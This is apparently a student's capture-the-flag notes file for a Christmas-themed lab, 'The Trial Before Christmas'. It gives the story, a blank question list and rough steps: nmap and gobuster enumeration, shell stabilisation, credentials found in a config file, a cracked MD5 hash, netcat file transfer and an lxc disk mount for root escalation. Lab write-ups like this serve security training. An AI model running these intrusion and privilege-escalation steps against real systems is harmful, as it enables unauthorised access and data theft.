#Day-23
....................................................................
====================================================================
#Day 23	: The Trial Before Christmas - Story:

It was the night before Christmas and The Best Festival Company could finally rest. All of the toys had been made and the company had recovered from attack after attack. Everything was in Santa's hands now, leaving the elves to do little more than wish him a safe journey ahead. Elf McEager sat at his terminal staring absentmindedly at light snow that had begun to fall. Just as he had drifted off to sleep Elf McEager was jolted to attention as a small parcel appeared just at the edge of his view. 

The present was wrapped in a deep blue velvet that appeared to shimmer in and out of the firelight, not unlike a blinking terminal prompt. Carefully, Elf McEager reached for the azure ribbon, untying it slowly so as to not damage it. The velvet slowly fell away, revealing a small NUC computer with a letter on top. Unfolding the letter, Elf McEager read it aloud:


"Elf McEager - your boundless effort to save Christmas this year has not gone unnoticed. I wanted to reward you with a special present, however, there's a catch. Elf McSkidy and I have seen your skills advance and we feel it would only be appropriate to give you a present after one last challenge. Inside this package, you'll have also found a computer. Plug this into the network and hack into it. Best of luck and Merry Christmas - Santa"


Without delay, Elf McEager connected the NUC appropriately and watched it whir to life. A small screen nearby the power button blinked and then displayed the IP address assigned to the device. Next to the IP, a small symbol appeared. McEager quietly wondered to himself what it could mean as he logged into his terminal, ready to start his final challenge. 
====================================================================
....................................................................
#Steps I aquire to gain answers:
----------------------------------
1st lets scan the machine with nmap:
#nmap -A -sC -sV -O -oN intial 10.10.184.10

we found the 2 posts open.

lets do the directory enumeration:
#gobuster dir -w 

python3 -c 'import pty; pty.spawn("/bin/bash")'

import TERM=xterm
(ctrl+z)
stty raw -echo; fg

$dbaddr = "localhost";
$dbuser = "tron";
$dbpass = "IFightForTheUsers";
$database = "tron";

Database name: tron
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
+----+----------+----------------------------------+

edc621628f6d19a13a00fd683f5e3ff7	md5	: @computer@


#To transfer the file using python server:
python -m SimpleHTTPServer

and wget on the other maching using the ip and the port given.


#And to transfer the files using netcat:

target machine		: nc -lp 4444 > fileName

attacker machine	: nc -w 3 ip port < fileName


lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

...............................................................
====================================================================
....................................................................

#1	Scan the machine. What ports are open?
	Ans: 

#2	What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
	Ans: 

#3	What is the name of the hidden php page?
	Ans: 

#4	What is the name of the hidden directory where file uploads are saved?
	Ans: 

#5	Bypass the filters. Upload and execute a reverse shell. 
	Ans: No Answer needed.

#6	What is the value of the web.txt flag?
	Ans: 

#7	Upgrade and stabilize your shell. 
	Ans: No answer needed.

#8	Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
	Ans: 

#9	Access the database and discover the encrypted credentials. What is the name of the database you find these in?
	Ans: 

#10	Crack the password. What is it?
	Ans: 

#11	Use su to login to the newly discovered user by exploiting password reuse. 
	Ans: 

#12	What is the value of the user.txt flag?
	Ans: 

#13	Check the user's groups. Which group can be leveraged to escalate privileges? 
	Ans: 

#14	Abuse this group to escalate privileges to root.
	Ans: No Answer Needed.

#15	What is the value of the root.txt flag?
	Ans: 

....................................................................
====================================================================